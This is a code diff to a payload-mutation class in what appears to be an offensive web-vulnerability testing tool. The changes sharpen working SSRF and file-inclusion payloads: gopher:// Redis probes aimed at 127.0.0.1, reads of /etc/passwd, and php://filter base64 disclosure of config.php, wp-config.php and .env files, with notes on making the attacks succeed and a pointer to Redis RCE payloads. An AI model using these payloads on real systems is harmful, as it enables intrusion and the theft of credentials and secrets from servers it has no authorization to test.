@@ -4,6 +4,7 @@ import os
 import re
 import pickle
 import sys
+from urllib.parse import urlparse
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from tool_config import get_tool_path, get_oob_domain
@@ -953,16 +954,21 @@ class PayloadMutation:
             except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                 pass
 
-        host = self._extract_host()
-        raw = f"gopher://{host}:6379/_INFO%0D%0A"
-        b64 = base64.b64encode(raw.encode()).decode()
-        payload = self._make_payload("wrapper_ssrf_gopher", "manual/redis-info-probe", None, b64)
-        payload["payload_raw"] = raw
-        payload["note"] = (
-            "Benign Redis INFO probe (non-destructive) to confirm SSRF reaches an internal Redis instance. "
-            "Gopherus not found — install for richer Redis/Memcached RCE payloads."
-        )
-        return canary_result + [payload]
+        redis_hosts = list(dict.fromkeys(["127.0.0.1", self._extract_host()]))
+        probe_results: Mutations = []
+        for h in redis_hosts:
+            raw = f"gopher://{h}:6379/_INFO%0D%0A"
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("wrapper_ssrf_gopher", f"manual/redis-info-probe/{h}", None, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                "Benign Redis INFO probe (non-destructive) to confirm SSRF reaches an internal Redis instance. "
+                "Redis is almost always bound to 127.0.0.1 from the vulnerable server's own point of view, not "
+                "the target's public hostname — try 127.0.0.1 first, the target's own host only as a secondary "
+                "guess. Gopherus not found — install for richer Redis/Memcached RCE payloads."
+            )
+            probe_results.append(payload)
+        return canary_result + probe_results
 
     def _mutate_wrapper_php_input(self) -> Mutations:
         results: Mutations = []
@@ -989,12 +995,18 @@ class PayloadMutation:
             results.append(payload)
         return results
 
+    SOURCE_DISCLOSURE_FILES = ["index.php", "config.php", "wp-config.php", ".env"]
+
     def _mutate_wrapper_lfi(self) -> Mutations:
         targets = [
             ("file:///etc/passwd", "Unix credential file"),
             ("file://C:\\Windows\\win.ini", "Windows config file"),
-            ("php://filter/convert.base64-encode/resource=index.php", "Source code disclosure"),
         ]
+        for filename in self.SOURCE_DISCLOSURE_FILES:
+            targets.append((
+                f"php://filter/convert.base64-encode/resource={filename}",
+                f"Source code disclosure ({filename})",
+            ))
         results: Mutations = []
         for raw, desc in targets:
             b64 = base64.b64encode(raw.encode()).decode()
@@ -1008,18 +1020,28 @@ class PayloadMutation:
         b64 = base64.b64encode(raw.encode()).decode()
         payload = self._make_payload("wrapper_traversal", "glob://", None, b64)
         payload["payload_raw"] = raw
-        payload["note"] = "Lists directory contents via glob:// stream wrapper — adjust path per target OS"
+        payload["note"] = (
+            "glob:// only implements directory-listing stream methods — works with opendir()/"
+            "readdir()/scandir()/DirectoryIterator sinks, NOT with include()/file_get_contents()/"
+            "fopen(). Also only lists matching names, does not read file contents. "
+            "Adjust path per target OS."
+        )
         return [payload]
 
     def _mutate_wrapper_stream(self) -> Mutations:
-        raw = "compress.zlib://php://filter/convert.base64-encode/resource=index.php"
+        raw = "php://filter/convert.base64-encode|zlib.deflate/resource=index.php"
         b64 = base64.b64encode(raw.encode()).decode()
-        payload = self._make_payload("wrapper_stream", "compress.zlib://", None, b64)
+        payload = self._make_payload("wrapper_stream", "php://filter (chained)", None, b64)
         payload["payload_raw"] = raw
-        payload["note"] = "Chained stream wrapper demonstrating filter+compression stacking"
+        payload["note"] = (
+            "Multiple filters stacked with '|' inside a single php://filter wrapper (applied "
+            "left to right) — the correct way to chain filters. Nesting compress.zlib:// around "
+            "a separate php://filter/... URL does NOT work: zlib expects real compressed bytes "
+            "following it, not the base64 text that convert.base64-encode produces."
+        )
         return [payload]
 
     def _extract_host(self) -> str:
         url = self.vector.get("url") or ""
-        match = re.search(r"://([^/:]+)", url)
-        return match.group(1) if match else "TARGET_HOST"
+        hostname = urlparse(url).hostname
+        return hostname or "TARGET_HOST"
